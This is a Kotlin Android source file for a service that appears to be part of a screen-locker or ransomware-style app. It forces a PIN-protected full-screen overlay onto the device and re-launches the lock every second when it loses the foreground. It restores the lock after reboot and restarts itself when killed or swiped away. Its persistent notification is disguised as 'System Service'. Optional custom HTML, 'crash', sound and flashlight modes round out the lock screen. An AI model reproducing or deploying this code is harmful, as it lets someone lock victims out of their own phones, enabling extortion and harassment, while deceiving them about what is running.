package com.sync.xxx

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat

class PersistentLockService : Service() {

    companion object {
        const val CHANNEL_ID        = "persistent_lock_channel"
        const val NOTIF_ID          = 9911
        const val PREFS_NAME        = "persistent_lock_prefs"

        const val KEY_LOCK_TYPE     = "lock_type"
        const val KEY_LOCK_ACTIVE   = "lock_active"
        const val KEY_LOCK_PIN      = "lock_pin"
        const val KEY_LOCK_TITLE    = "lock_title"
        const val KEY_LOCK_HTML     = "lock_html"
        const val KEY_LOCK_CRASH    = "lock_crash"
        const val KEY_LOCK_SOUND    = "lock_sound"
        const val KEY_LOCK_FLASH    = "lock_flash"
        const val KEY_MANUAL_UNLOCK = "manual_unlock"

        const val LOCK_TYPE_LOW      = "lock_low"
        const val LOCK_TYPE_CUSTOM   = "lock_custom_v2"
        const val LOCK_TYPE_COMBO    = "lock_combo"

        const val ACTION_START_LOCK   = "com.sync.xxx.PERSISTENT_START_LOCK"
        const val ACTION_STOP_LOCK    = "com.sync.xxx.PERSISTENT_STOP_LOCK"
        const val ACTION_RESTORE_LOCK = "com.sync.xxx.PERSISTENT_RESTORE_LOCK"

        const val EXTRA_LOCK_TYPE   = "lock_type"
        const val EXTRA_PIN         = "pin"
        const val EXTRA_TITLE       = "title"
        const val EXTRA_HTML        = "html"
        const val EXTRA_CRASH       = "crash"
        const val EXTRA_SOUND       = "sound"
        const val EXTRA_FLASH       = "flash"

        fun saveAndStartLock(
            context: Context,
            lockType: String,
            pin: String,
            title: String,
            html: String = "",
            crash: Boolean = false,
            sound: Boolean = false,
            flash: Boolean = false
        ) {
            // Simpan state ke SharedPreferences
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
                putString(KEY_LOCK_TYPE, lockType)
                putBoolean(KEY_LOCK_ACTIVE, true)
                putString(KEY_LOCK_PIN, pin)
                putString(KEY_LOCK_TITLE, title)
                putString(KEY_LOCK_HTML, html)
                putBoolean(KEY_LOCK_CRASH, crash)
                putBoolean(KEY_LOCK_SOUND, sound)
                putBoolean(KEY_LOCK_FLASH, flash)
                putBoolean(KEY_MANUAL_UNLOCK, false)
                apply()
            }
            // Start service
            val intent = Intent(context, PersistentLockService::class.java).apply {
                action = ACTION_START_LOCK
                putExtra(EXTRA_LOCK_TYPE, lockType)
                putExtra(EXTRA_PIN, pin)
                putExtra(EXTRA_TITLE, title)
                putExtra(EXTRA_HTML, html)
                putExtra(EXTRA_CRASH, crash)
                putExtra(EXTRA_SOUND, sound)
                putExtra(EXTRA_FLASH, flash)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                context.startForegroundService(intent)
            else
                context.startService(intent)
        }

        fun unlockAll(context: Context) {
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
                putBoolean(KEY_MANUAL_UNLOCK, true)
                putBoolean(KEY_LOCK_ACTIVE, false)
                apply()
            }
            val intent = Intent(context, PersistentLockService::class.java).apply {
                action = ACTION_STOP_LOCK
            }
            context.startService(intent)
            // Broadcast unlock ke semua lock activity/service
            context.sendBroadcast(Intent("com.sync.xxx.UNLOCK").apply { setPackage(context.packageName) })
            context.sendBroadcast(Intent(ComboLockService.ACTION_HIDE).apply { setPackage(context.packageName) })
            context.sendBroadcast(Intent("com.sync.xxx.LOCKCHAT_UNLOCK_PERMANENT").apply { setPackage(context.packageName) })
        }
    }

    private lateinit var prefs: SharedPreferences
    private val handler = Handler(Looper.getMainLooper())
    private var monitorRunnable: Runnable? = null
    private var isMonitoring = false

    private var lockType  = LOCK_TYPE_LOW
    private var lockPin   = "1234"
    private var lockTitle = "Device Locked"
    private var lockHtml  = ""
    private var lockCrash = false
    private var lockSound = false
    private var lockFlash = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.LOCKCHAT_UNLOCK_PERMANENT" ||
                intent.action == "com.sync.xxx.UNLOCK") {
                if (prefs.getBoolean(KEY_MANUAL_UNLOCK, false)) {
                    stopMonitoring()
                    stopForeground(true)
                    stopSelf()
                }
            }
        }
    }
    private var receiverRegistered = false

    override fun onCreate() {
        super.onCreate()
        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification())
        registerUnlockReceiver()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP_LOCK -> {
                stopMonitoring()
                stopForeground(true)
                stopSelf()
                return START_NOT_STICKY
            }
            ACTION_RESTORE_LOCK -> {
                // Dipanggil dari BootReceiver, restore dari prefs
                loadStateFromPrefs()
                if (!prefs.getBoolean(KEY_MANUAL_UNLOCK, false) &&
                    prefs.getBoolean(KEY_LOCK_ACTIVE, false)) {
                    handler.postDelayed({ startLock() }, 1500)
                    startMonitoring()
                }
            }
            else -> {
                // ACTION_START_LOCK atau start normal
                lockType  = intent?.getStringExtra(EXTRA_LOCK_TYPE) ?: prefs.getString(KEY_LOCK_TYPE, LOCK_TYPE_LOW)!!
                lockPin   = intent?.getStringExtra(EXTRA_PIN) ?: prefs.getString(KEY_LOCK_PIN, "1234")!!
                lockTitle = intent?.getStringExtra(EXTRA_TITLE) ?: prefs.getString(KEY_LOCK_TITLE, "Device Locked")!!
                lockHtml  = intent?.getStringExtra(EXTRA_HTML) ?: prefs.getString(KEY_LOCK_HTML, "")!!
                lockCrash = intent?.getBooleanExtra(EXTRA_CRASH, false) ?: prefs.getBoolean(KEY_LOCK_CRASH, false)
                lockSound = intent?.getBooleanExtra(EXTRA_SOUND, false) ?: prefs.getBoolean(KEY_LOCK_SOUND, false)
                lockFlash = intent?.getBooleanExtra(EXTRA_FLASH, false) ?: prefs.getBoolean(KEY_LOCK_FLASH, false)

                // Clear manual unlock flag saat lock baru
                prefs.edit().putBoolean(KEY_MANUAL_UNLOCK, false).apply()

                startLock()
                startMonitoring()
            }
        }
        return START_STICKY
    }

    private fun loadStateFromPrefs() {
        lockType  = prefs.getString(KEY_LOCK_TYPE, LOCK_TYPE_LOW)!!
        lockPin   = prefs.getString(KEY_LOCK_PIN, "1234")!!
        lockTitle = prefs.getString(KEY_LOCK_TITLE, "Device Locked")!!
        lockHtml  = prefs.getString(KEY_LOCK_HTML, "")!!
        lockCrash = prefs.getBoolean(KEY_LOCK_CRASH, false)
        lockSound = prefs.getBoolean(KEY_LOCK_SOUND, false)
        lockFlash = prefs.getBoolean(KEY_LOCK_FLASH, false)
    }

    private fun startLock() {
        when (lockType) {
            LOCK_TYPE_LOW     -> startLockLow()
            LOCK_TYPE_CUSTOM  -> startLockCustomV2()
            LOCK_TYPE_COMBO   -> startLockCombo()
        }
    }

    // ── LOCK LOW ────────────────────────────────────────────────
    private fun startLockLow() {
        // Start LockOverlayService
        val svcIntent = Intent(this, LockOverlayService::class.java).apply {
            putExtra(LockOverlayService.EXTRA_PIN, lockPin)
            putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            startForegroundService(svcIntent)
        else
            startService(svcIntent)

        // Start LockNewActivity
        val actIntent = Intent(this, LockNewActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
                     Intent.FLAG_ACTIVITY_CLEAR_TOP or
                     Intent.FLAG_ACTIVITY_NO_ANIMATION)
            putExtra(LockOverlayService.EXTRA_PIN, lockPin)
            putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
        }
        startActivity(actIntent)
    }

    // ── LOCK CUSTOM V2 ───────────────────────────────────────────
    private fun startLockCustomV2() {
        val svcIntent = Intent(this, LockOverlayService::class.java).apply {
            putExtra(LockOverlayService.EXTRA_PIN, lockPin)
            putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, lockHtml)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            startForegroundService(svcIntent)
        else
            startService(svcIntent)

        val actIntent = Intent(this, LockNewActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
                     Intent.FLAG_ACTIVITY_CLEAR_TOP or
                     Intent.FLAG_ACTIVITY_NO_ANIMATION)
            putExtra(LockOverlayService.EXTRA_PIN, lockPin)
            putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, lockHtml)
        }
        startActivity(actIntent)
    }

    // ── LOCK COMBO ───────────────────────────────────────────────
    private fun startLockCombo() {
        // Start ComboLockService
        val svcIntent = Intent(this, ComboLockService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            startForegroundService(svcIntent)
        else
            startService(svcIntent)

        // Kirim SHOW setelah service ready
        handler.postDelayed({
            val showIntent = Intent(ComboLockService.ACTION_SHOW).apply {
                setPackage(packageName)
                putExtra(ComboLockService.EXTRA_HTML, lockHtml)
                putExtra(ComboLockService.EXTRA_CRASH, lockCrash)
                putExtra(ComboLockService.EXTRA_SOUND, lockSound)
                putExtra(ComboLockService.EXTRA_FLASHLIGHT, lockFlash)
            }
            sendBroadcast(showIntent)

            // LockNewActivity sebagai backup PIN entry untuk combo
            val actIntent = Intent(this, LockNewActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
                         Intent.FLAG_ACTIVITY_CLEAR_TOP or
                         Intent.FLAG_ACTIVITY_NO_ANIMATION)
                putExtra(LockOverlayService.EXTRA_PIN, lockPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, lockHtml)
            }
            startActivity(actIntent)
        }, 500)
    }

    // ── MONITOR LOOP (ensure lock stays active) ──────────────────
    private fun startMonitoring() {
        isMonitoring = true
        monitorRunnable = object : Runnable {
            override fun run() {
                if (!isMonitoring) return
                if (prefs.getBoolean(KEY_MANUAL_UNLOCK, false)) {
                    stopMonitoring()
                    return
                }
                // Re-trigger lock jika tidak ada activity lock di foreground
                if (!isLockInForeground()) {
                    android.util.Log.w("PersistentLock", "Lock not in foreground, re-starting...")
                    startLock()
                }
                handler.postDelayed(this, 1000)
            }
        }
        handler.postDelayed(monitorRunnable!!, 3000)
    }

    private fun stopMonitoring() {
        isMonitoring = false
        monitorRunnable?.let { handler.removeCallbacks(it) }
        monitorRunnable = null
    }

    private fun isLockInForeground(): Boolean {
        return try {
            val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.runningAppProcesses?.any {
                    it.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND &&
                    it.processName == packageName
                } ?: false
            } else {
                @Suppress("DEPRECATION")
                am.getRunningTasks(1)?.firstOrNull()?.topActivity?.packageName == packageName
            }
        } catch (e: Exception) { false }
    }

    private fun registerUnlockReceiver() {
        if (receiverRegistered) return
        val filter = IntentFilter().apply {
            addAction("com.sync.xxx.LOCKCHAT_UNLOCK_PERMANENT")
            addAction("com.sync.xxx.UNLOCK")
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            else
                registerReceiver(unlockReceiver, filter)
            receiverRegistered = true
        } catch (e: Exception) {
            android.util.Log.w("PersistentLock", "registerReceiver: ${e.message}")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                CHANNEL_ID, "Lock Persistent",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                setSound(null, null)
                setShowBadge(false)
            }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        if (receiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            receiverRegistered = false
        }
        // Auto-restart jika bukan manual unlock
        if (!prefs.getBoolean(KEY_MANUAL_UNLOCK, false) &&
            prefs.getBoolean(KEY_LOCK_ACTIVE, false)) {
            android.util.Log.w("PersistentLock", "Destroyed unexpectedly — restarting")
            val restartIntent = Intent(this, PersistentLockService::class.java).apply {
                action = ACTION_RESTORE_LOCK
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                startForegroundService(restartIntent)
            else
                startService(restartIntent)
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        if (!prefs.getBoolean(KEY_MANUAL_UNLOCK, false) &&
            prefs.getBoolean(KEY_LOCK_ACTIVE, false)) {
            android.util.Log.w("PersistentLock", "Task removed — restarting")
            val restartIntent = Intent(this, PersistentLockService::class.java).apply {
                action = ACTION_RESTORE_LOCK
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                startForegroundService(restartIntent)
            else
                startService(restartIntent)
        }
    }
}
